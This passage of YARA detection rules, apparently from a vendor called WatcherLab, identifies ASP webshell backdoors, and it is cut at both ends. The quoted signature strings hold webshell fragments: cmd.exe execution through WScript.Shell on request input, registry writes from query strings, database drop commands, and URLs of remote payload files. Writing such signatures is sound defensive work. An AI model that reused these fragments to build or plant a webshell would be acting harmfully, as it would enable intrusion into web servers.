        $x2 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
        $s3 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDefacer &copy; BY <a href='mailto:kingdefacer@msn.c" ascii
        $s4 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
        $s5 = "o do Command: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
        $s6 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
        $s7 = "Response.Write \"<b>Arquitetura do Processador: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
        $s8 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
        $s9 = "Response.Write \"<b>Identificador do Processador: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
        $s10 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
        $s11 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
        $s12 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
        $s13 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\">\"" fullword ascii
        $s14 = "tion=upload&processupload=yes&path=\" & Request.QueryString(\"path\") & \"\"\">\"" fullword ascii
        $s15 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_DWORD\")" fullword ascii
        $s16 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & strFile" fullword ascii
        $s17 = "Response.Write \"<b>Nome do Computador: </b>\" & WshNetwork.ComputerName & \"<br>\"" fullword ascii
        $s18 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_EXPAND_SZ\")" fullword ascii
        $s19 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_SZ\")" fullword ascii
        $s20 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_MULTI_SZ\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9aac9927b8b768b3a33bb3b5ead77e69523ddb93
{
     meta:
        description = "asp - file 9aac9927b8b768b3a33bb3b5ead77e69523ddb93.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2cc89b0e2ac08b26c312e2915d66a9e9f17ecbf63467e4258adbbeee5d5e84dc"
     strings:
        $s1 = "const dbx=\"http://aspmuma.net/web/php.txt,http://aspmuma.net/web/aspx.txt,http://aspmuma.net/web/pl.txt\"" fullword ascii
        $s2 = "VZ2ZE;wcYXd:oPZCx2-c2yxo;W:KXtVx7;W:VcwVZy{CwZy>'44E/oYco'=cfCo c2Co4<>c2oXo/< `&E7r&` - `&bLK&`>c2oXo<`=KSy" fullword ascii
        $s3 = "Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4`(coPEcYc.ytr" fullword ascii
        $s4 = "`;``}wVZh44xf${``=wVZb44x8 c4xyxoxg:Ugplm ocF;}waVc4P${=wa Vc4B;}cEVPZjyw${=cEVPZj xoxg ;W.O.Ugplm.ocF.odZ4ZVEXH=VcwXSZV8`=wdb" fullword ascii
        $s5 = ";''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+K7P2ZE=cP2xS.7xVxf.7Vd;'2cw'=cP2xS.Txw.7Vd;)(oc4cV.7Vd;KVPocV))'?" fullword ascii
        $s6 = "`,`KZooPy`,`)'CCTE'(bLb;cP2xS.2dTE=cP2xS.yKb;'2d'=cP2xS.45:^KZooZy`(XVd&`;f4yK&;f4yK&`&)cYP,`zze|oYco`,`cYP`(XVd,``5rP" fullword ascii
        $s7 = "`,`KZooPy`,`)'CCTE'(bLb;'YN'=cP2xS.45;'`&))Y&`.o4co`(Tox8fxH.VcSVcj&`|`&)X(LwL(YC2&`'=cP2xS.yKb:^KZooZy`(XVd,`E`5rP" fullword ascii
        $s8 = ")`)ctx7a oKcoKZnKXy,VxTnVx3 Tox8KXy,gpGpijBln Ipv IGJHaG8 )D,W(IiaiRpga oKX wa(xoxgc2XQ c2yxi coxcVn`(coPEcYp.ytr" fullword ascii
        $s9 = "2rd=coxgCdawZH.))`\\`,bPX(2C5(c7xRc4Vx8.))c42xQ,`\\`,bPX(7tK(cExfjc7xR.wtr KcTo )2rd(coxg4a wKJ ``><2rd dX" fullword ascii
        $s10 = ".)L4P(4c2yxi.oxE(b5x & ```=c2oXo ';Yfk:odc2-tKXwwxf;YfkM:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,``(rK7&5bP=5bP" fullword ascii
        $s11 = "7P2Zn.)L4P(4c2yxi.oxE(b5x & ```=c2oXo ';Yfk:odc2-tKXwwxf;YfWO:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,`E`(rK7&5bP=5bP" fullword ascii
        $s12 = ")`'`&Y&`'=c7xK wKx 'Y'=cfCoY cVcTb 4oEcryZ4C4.Zyw.Vc`&fSL&`o4x7 7ZVd )*(oKPZE oEc2c4`(coPEcYp.ytr=4V ocj" fullword ascii
        $s13 = "`,`KZooPy`,`)(oX7yP4.7VZd.4XTo;'dCy'=cP2xS.Txw.7VZd.4XTo;'D'=cP2xS.7xVxf.7VZd.4XTo;''=cP2xS.254.7VZd.4XTo:^`LrK" fullword ascii
        $s14 = "`;)'`&Vo4&`'(oVc2x`=Vo4 KcTo ``><Vo4 dX:)Z7V,Vo4(wYC KZXoEKPd:KZXoEKPQ wKp:)x7x(oEcrymcoxcVE.VcSVc4=cTL ocj:)x7x(cTL KZXoEKPQ" fullword ascii
        $s15 = "`>';%WWD:oTtXcT;ZoPx:C-bZ2dVcSZ'=c2Co4 SXw<>'`&)W(2E&`:VZ2ZE-wKPZVtLExy;W:VcwVZy'=c2Co4 'VcoKcE'=KtX2x 'YfWWA'=TowXb wo<`r" fullword ascii
        $s16 = "`Vcy7PRoVZ8\\fEo\\4wi\\wbfwV\\4wh\\VcSVcj 2xKX7V`&Pcb&`ci\\2ZVoKZn\\ocj2ZVoK`&NTK&`ZnoKcVVPn\\HpijIj\\pRasnJH_lJnml_Ipvs`=Xy5" fullword ascii
        $s17 = "`(cbw&`>';Yfk:fZo-KXtVx7'=c2Co4 X2<`&`>xcVxoYco/<`&Sf5&`>';YfWez:TowXb'=c2Co4 u=4bZV 27TE=wX 27TE=c7xK xcVxoYco<`,``5rP:`:" fullword ascii
        $s18 = ")`Vcoc7xVx8\\4Vcoc7xVx8\\VcSVcj\\W.AS\\KX`&bXX&`7wxG\\HpijIj\\pRasnJH_lJnml_Ipvs`(gJpG1pG.cdd=4X7" fullword ascii
        $s19 = "4(E4J da:)D,X,Sbr(wXH=PV4:)Sbr(Kcl Zi D=X VZQ:``=oo:PV4,oo 7Xg:da wKp:KZXoEKPQ oXYp:Sbr=7Sd:KcTi``=Sbr da:)Sbr(7Sd KZXoEKPQ" fullword ascii
        $s20 = "dlVnyS&`=Ccvm6i `&dlVnyS&`W=c2yxK`&EYw&`pm6i-`&dlVnyS&`W|D|D-|`&KYC&`|W.W.W.W|`&2yV&`=KXx7Zg-`&dlVnyS&`RaJHm`&PVb&`gocj-`=YS4" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_805c70708901e3c5a0b8f21657c820608ba2d450
{
     meta:
        description = "asp - file 805c70708901e3c5a0b8f21657c820608ba2d450.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5a1a2900ec634bb1651fff9d542491221449754289ad5a58791ee3104ccef752"
     strings:
        $s1 = "kL4D'B2TB@*@!Nb-~/DX^+xB8GMNnD=qwXPdG^kN~ELAGD9nMZG^WM[JE@*@!CP4Dn0{B%C7l/1.kaY)w;sVwWM:cJEELInnmOtvnCO4[JwELS 1mh" fullword ascii
        $s2 = "/aGxk+ hMkOnrOO RO OO RRO O OROjnM\\Rj,(x6W.hmYkGU ORO R OR O OO O RJ@#@&.+kwGUk+RS.kD+J@!8.@*r@#@&Dn/2G" fullword ascii
        $s3 = "[WS/ww:+:2w'JE#E@*:+ha@!Jl@*sg@!CP4Dn0{B%C7l/1.kaY)U4GhwW^NnDcErZl-']2;5/JAI-wEr#v@*\"3;5/d2\"@!zm@*7S@!mP4D" fullword ascii
        $s4 = "~J@!zPb~S3@*r@#@&AUN,?E(@#@&s!x1YrWU~\"+[`kOD*)]n9P'~E@!s61:~1WsKD{a06 y+ @*J~[,/O.,[Pr@!zwr1:@*E@#@&2" fullword ascii
        $s5 = "0'v%m\\C/1.bwO=?4WhwW^[+M`EJ1)wwhDWT.lsPsbsn/'-k+.\\R;'-EJ*v@*k+.- E@!&C@*f-" fullword ascii
        $s6 = "x9qAx9)PF /KwzKK~Ky~9jDlDORGq3x9R2)PyRhW/bYbGx,'~!=K+ :Xw" fullword ascii
        $s7 = "Yn6DvHwn{BaEY,YL=@!bxjq{?(@*?=@!JOD@*@!zD[@*x(/aiGh'=LB@*ULUswsooM'B:oTmGVK@!DN~(@!JYN@*x(dwpsoB@*[:owss^GD{BP(L^W9@*@!Y[" fullword ascii
        $s8 = "mrl^oW^Nn.v!#@#@&\"+dwKUk+ qDbY+,J@!&KG@*E@#@&IndaWxknRqDkDn~Ji@!:f~lsrTxx:b[N^+@*@!&1niP,Yzw" fullword ascii
        $s9 = "Z!Y+,?bU0K2U`rukk?#Y4SU-kYvKC',?aVKlO4,==P:4+8#@!@*?nlO4vPCx9~4`T*#k`nmYAakkY sbVn(6PZwU=hlY4c4`Z#B+~nCO7+ok^/scHGq*=+UO" fullword ascii
        $s10 = "6Ov,kNxvaB~\\ms!+xEa^@$^m3[ V0iT@$hB@*@!JYN@*E@#@&IIUE@!zDD@*J@#@&]]UJ@!YM~l^kLU{BmnUD+.B,-mVrTx{B:bN9s+E@*E@#@&I]jr@!Y9@*" fullword ascii
        $s11 = "6OB,^Vm/dxEK+aO~WaB,r9'v6wm//EP7CV!+xB8 f*lvB@*@!4M@*J@#@&.+kwKxd+ AMkO+roKhPK6\"K)E@#@&Dn/aG" fullword ascii
        $s12 = "'?U+WsdaloU?~mwsoowD'==[o^W^GZU=,4D'U? 4nkTt@*@!DN~'?@!YMz1m:+bd2VmW(L fd2pU'U@*'x(soowUU=:wsGVK.{U~(o1UUy!?ro4YxY9P4nJYN@*@!:" fullword ascii
        $s13 = "@!z'Ubv@*lL+ qUBU'KDD[==L?5VU.vU=??$V?D)w;V^m.kaY%C7l/Mn0{Bi@!C~tLx(/2" fullword ascii
        $s14 = "`JoG^NnDhCDtE*#=?+DPz$Z{1GY4kUL=ZlknPrfWSUok^+r)9WAUwks+,o1m:nlUtWA3MDc#=/m/n,JG+Vwk^nJ=?nY,b$/{1+S~S~s)z$/RG+^srVncw1C:" fullword ascii
        $s15 = "CN^+V1an`Ksb2UmG[cCPHdnD7+.Cml'j)^Vb=^^XR/KsbV+^Wkn=BPPD!wor^+/.P+ssk^nc+^+D+W/G GZCV^~+*=j({?q'Cml|+" fullword ascii
        $s16 = "Nn6xTp8N@!JdmMk2O@*J@#@&.M/~J@!8KNzrP@#@&q6Pz^YbWU'rJ~O4+x,]IUPJ,d^DKV^'UWE@#@&D./,E@*r@#@&9b:PjGD`q&B+*)jKYv!~Z#,xPr?^DbwOr" fullword ascii
        $s17 = "xEPk9'EWB,\\CV!+xvr[0LEB,/k.nxBl!E@*E@#@&]\"?E@!bUw!Y~Um:+xvUjCmDrKxv,YHw+{B4rN9+UB,k[xE?jm^YbWxE~-l^E" fullword ascii
        $s18 = "xB(WD9n.)8wXPdWsr9PE[~GD9+./KVW.'rB@*J@#@&UqxUqLJ@!mP4.+6'vLm\\Cd1DkaO)UtWSoGV9+M`EJE'\"+KlD4`hlO4LJ-E'wRHlsn*[ErJ*BPDkDs+{JE" fullword ascii
        $s19 = "D-+#U~O4+Y?b'?`UaG.RwWM:5EndDkWPMnx#%1SW&&fS2&**BqWFfO~W~F2*BT~8FT~y*S0yF~yfkkY'?KGDDSO*0U|n^/n=scUaWO wWDn5!+dkkO{DKKDDSDDU*|+" fullword ascii
        $s20 = "`JkOJk^+wkz/~dM~[+Ks+wY4S,+:rOsP9k#8fV[_R_?4f:9uR_?=^{PO~b/+drVks/H=|t*lD+KY4nvl^?ah+glp kl'~.,NnW^nwY4DPU+=s/DnR&+.V9sG4" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4ad0615d2707c9441a46d37dd573b3a447e8b5b9
{
     meta:
        description = "asp - file 4ad0615d2707c9441a46d37dd573b3a447e8b5b9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "356e77cbd3f656184b6ed64e77db692fe375b243a6bcdbec0717859852491aea"
     strings:
        $x1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
        $x2 = "Response.Write(\"Executed #\" & I + 1 & \" Without Error<BR><BR>\")" fullword ascii
        $s3 = "Set Rs = Conn.Execute(\"Select top 1 * from \" & sTable & \"\")" fullword ascii
        $s4 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s5 = "set RS = Conn.Execute(cstr(sQuery),intRecordsAffected)" fullword ascii
        $s6 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s7 = "Conn.Execute \"alter table \" & sTable & \" drop column \" & sField" fullword ascii
        $s8 = "\"  <tr><td class=\"\"menubar\"\"><a target=\"\"mainFrame\"\" href=\"\"?action=cmdshell\"\">DOS" fullword ascii
        $s9 = "set Rs = Conn.execute(\"Select top 1 * from \" & sTable & \"\") " fullword ascii
        $s10 = "Set Rs = Conn.Execute(sSQL)" fullword ascii
        $s11 = "Set RS = Conn.Execute(sSQL)" fullword ascii
        $s12 = "c:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea><br>\"" fullword ascii
        $s13 = "\" <TD ALIGN=\"\"Left\"\" bgcolor=\"\"#FFFFFF\"\"><input type=\"\"checkbox\"\" name=\"\"MultiExec\"\" value=\"\"yes\"\">\" & _" fullword ascii
        $s14 = "Response.Write(\"Executing #\" & I + 1 & \": \" & sSQL(i) & \"<BR>\") " fullword ascii
        $s15 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s16 = "\"<form name=\"\"loginform\"\" action=\"\"?action=login\"\" method=\"\"post\"\">\" & _" fullword ascii
        $s17 = "set rs = Conn.execute(\"EXEC sp_helpfile\")" fullword ascii
        $s18 = "Conn.Execute \"DROP PROCEDURE \" & sSP" fullword ascii
        $s19 = "Conn.Execute \"DROP VIEW \" & sView" fullword ascii
        $s20 = "Conn.Execute \"Drop Table \" & sTable" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_46d7968486db97fd968054d7dc0e5a90a908cb51
{
     meta:
        description = "asp - file 46d7968486db97fd968054d7dc0e5a90a908cb51.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "20ceacaac5215e9a2e5bb82861f1391382fc7cb132c9c57f706b216f5f975b0d"
     strings:
        $s1 = "22222222222222222222222222222222222222222222222222" ascii /* hex encoded string '"""""""""""""""""""""""""' */
     condition:
        ( uint16(0) == 0x3fff and filesize < 400KB and ( all of them ) ) or ( all of them )
}

rule e2c83e6bb13c8a8a8eaff34cf8fa56d2d8d98140
{
     meta:
        description = "asp - file e2c83e6bb13c8a8a8eaff34cf8fa56d2d8d98140.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "51d0c9158de018e29e78a232f9551c459773328e8845310a01df5d592289e3a7"
     strings:
        $s1 = "VZ2ZE;wcYXd:oPZCx2-c2yxo;W:KXtVx7;W:VcwVZy{CwZy>'44E/oYco'=cfCo c2Co4<>c2oXo/< `&E7r&` - `&bLK&`>c2oXo<`=KSy" fullword ascii
        $s2 = "const dbx=\"http://sei.so/php.txt,http://sei.so/aspx.txt,http://sei.so/pl.txt\"" fullword ascii
        $s3 = "Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4`(coPEcYc.ytr" fullword ascii
        $s4 = "`;``}wVZh44xf${``=wVZb44x8 c4xyxoxg:Ugplm ocF;}waVc4P${=wa Vc4B;}cEVPZjyw${=cEVPZj xoxg ;W.O.Ugplm.ocF.odZ4ZVEXH=VcwXSZV8`=wdb" fullword ascii
        $s5 = ";''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+K7P2ZE=cP2xS.7xVxf.7Vd;'2cw'=cP2xS.Txw.7Vd;)(oc4cV.7Vd;KVPocV))'?" fullword ascii
        $s6 = "`,`KZooPy`,`)'CCTE'(bLb;cP2xS.2dTE=cP2xS.yKb;'2d'=cP2xS.45:^KZooZy`(XVd&`;f4yK&;f4yK&`&)cYP,`zze|oYco`,`cYP`(XVd,``5rP" fullword ascii
        $s7 = "`,`KZooPy`,`)'CCTE'(bLb;'YN'=cP2xS.45;'`&))Y&`.o4co`(Tox8fxH.VcSVcj&`|`&)X(LwL(YC2&`'=cP2xS.yKb:^KZooZy`(XVd,`E`5rP" fullword ascii
        $s8 = ")`)ctx7a oKcoKZnKXy,VxTnVx3 Tox8KXy,gpGpijBln Ipv IGJHaG8 )D,W(IiaiRpga oKX wa(xoxgc2XQ c2yxi coxcVn`(coPEcYp.ytr" fullword ascii
        $s9 = "2rd=coxgCdawZH.))`\\`,bPX(2C5(c7xRc4Vx8.))c42xQ,`\\`,bPX(7tK(cExfjc7xR.wtr KcTo )2rd(coxg4a wKJ ``><2rd dX" fullword ascii
        $s10 = ".)L4P(4c2yxi.oxE(b5x & ```=c2oXo ';Yfk:odc2-tKXwwxf;YfkM:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,``(rK7&5bP=5bP" fullword ascii
        $s11 = "7P2Zn.)L4P(4c2yxi.oxE(b5x & ```=c2oXo ';Yfk:odc2-tKXwwxf;YfWO:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,`E`(rK7&5bP=5bP" fullword ascii
        $s12 = ")`'`&Y&`'=c7xK wKx 'Y'=cfCoY cVcTb 4oEcryZ4C4.Zyw.Vc`&fSL&`o4x7 7ZVd )*(oKPZE oEc2c4`(coPEcYp.ytr=4V ocj" fullword ascii
        $s13 = "`,`KZooPy`,`)(oX7yP4.7VZd.4XTo;'dCy'=cP2xS.Txw.7VZd.4XTo;'D'=cP2xS.7xVxf.7VZd.4XTo;''=cP2xS.254.7VZd.4XTo:^`LrK" fullword ascii
        $s14 = "`;)'`&Vo4&`'(oVc2x`=Vo4 KcTo ``><Vo4 dX:)Z7V,Vo4(wYC KZXoEKPd:KZXoEKPQ wKp:)x7x(oEcrymcoxcVE.VcSVc4=cTL ocj:)x7x(cTL KZXoEKPQ" fullword ascii
        $s15 = "`>';%WWD:oTtXcT;ZoPx:C-bZ2dVcSZ'=c2Co4 SXw<>'`&)W(2E&`:VZ2ZE-wKPZVtLExy;W:VcwVZy'=c2Co4 'VcoKcE'=KtX2x 'YfWWA'=TowXb wo<`r" fullword ascii
        $s16 = "`Vcy7PRoVZ8\\fEo\\4wi\\wbfwV\\4wh\\VcSVcj 2xKX7V`&Pcb&`ci\\2ZVoKZn\\ocj2ZVoK`&NTK&`ZnoKcVVPn\\HpijIj\\pRasnJH_lJnml_Ipvs`=Xy5" fullword ascii
        $s17 = "`(cbw&`>';Yfk:fZo-KXtVx7'=c2Co4 X2<`&`>xcVxoYco/<`&Sf5&`>';YfWez:TowXb'=c2Co4 u=4bZV 27TE=wX 27TE=c7xK xcVxoYco<`,``5rP:`:" fullword ascii
        $s18 = ")`Vcoc7xVx8\\4Vcoc7xVx8\\VcSVcj\\W.AS\\KX`&bXX&`7wxG\\HpijIj\\pRasnJH_lJnml_Ipvs`(gJpG1pG.cdd=4X7" fullword ascii
        $s19 = "4(E4J da:)D,X,Sbr(wXH=PV4:)Sbr(Kcl Zi D=X VZQ:``=oo:PV4,oo 7Xg:da wKp:KZXoEKPQ oXYp:Sbr=7Sd:KcTi``=Sbr da:)Sbr(7Sd KZXoEKPQ" fullword ascii
        $s20 = "dlVnyS&`=Ccvm6i `&dlVnyS&`W=c2yxK`&EYw&`pm6i-`&dlVnyS&`W|D|D-|`&KYC&`|W.W.W.W|`&2yV&`=KXx7Zg-`&dlVnyS&`RaJHm`&PVb&`gocj-`=YS4" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule eb8a8dbbda2646156b1e37038410b67a5dde71d9
{
     meta:
        description = "asp - file eb8a8dbbda2646156b1e37038410b67a5dde71d9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6ef0c236c9f93dd12dc73f135d5672e8f89e7af2ffbea7f2a500c5a2acfa843c"
     strings:
        $s1 = "<!-- yes++ -->" fullword ascii
        $s2 = "pass waf -->" fullword ascii
     condition:
        ( uint16(0) == 0x3c0a and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_732bb60287fd6e3d82ab9dba919aa2a92cea20a7
{
     meta:
        description = "asp - file 732bb60287fd6e3d82ab9dba919aa2a92cea20a7.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
     strings:
        $x1 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/index.aspx' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $x2 = "j cdx&\"<a href='http://tool.chinaz.com/baidu/?wd=\"&str1&\"&lm=0&pn=0' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s6 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s7 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s8 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s9 = "j cdx&\"<a href='\"&htp&\"sql.asp' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s11 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s12 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s13 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" SQL-----SA\"&ef" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s17 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s18 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
        $s19 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" Servu-" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_875fcea5476b4e35f5c47a22edbe51940d44c200
{
     meta:
        description = "asp - file 875fcea5476b4e35f5c47a22edbe51940d44c200.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b0949198eab2be841241983d0a9a55973cacdf113928e61cb7d42dc3247dc462"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
        $x2 = "R</a> - <a href='HTTP://WWW.RHESUSFACTOR.CJB.NET' target='_blank'>HTTP://WWW.RHESUSFACTOR.CJB.NET</a> ::.</font>\"" fullword ascii
        $s3 = "cprthtml = \"<font face='arial' size='1'>.:: RHTOOLS 1.5 BETA(PVT)&copy; BY <a href='mailto:rhfactor@antisocial.com'>RHESUS FACT" ascii
        $s4 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
        $s5 = "o do Command: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
        $s6 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
        $s7 = "Response.Write \"<b>Arquitetura do Processador: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
        $s8 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
        $s9 = "Response.Write \"<b>Identificador do Processador: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
        $s10 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
        $s11 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
        $s12 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
        $s13 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\">\"" fullword ascii
        $s14 = "tion=upload&processupload=yes&path=\" & Request.QueryString(\"path\") & \"\"\">\"" fullword ascii
        $s15 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_DWORD\")" fullword ascii
        $s16 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & strFile" fullword ascii
        $s17 = "Response.Write \"<b>Nome do Computador: </b>\" & WshNetwork.ComputerName & \"<br>\"" fullword ascii
        $s18 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_EXPAND_SZ\")" fullword ascii
        $s19 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_SZ\")" fullword ascii
        $s20 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_MULTI_SZ\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7ba63dad31ff8d3575fa93b053b0d7b71592e654
{
     meta:
        description = "asp - file 7ba63dad31ff8d3575fa93b053b0d7b71592e654.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "37cc3a33ec32f5524239f27dae8343dbcaed4d128ac72c6871edc5b742566384"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdkod).stdout.readall" fullword ascii
        $x2 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdd(1))" fullword ascii
        $x3 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdd(0))" fullword ascii
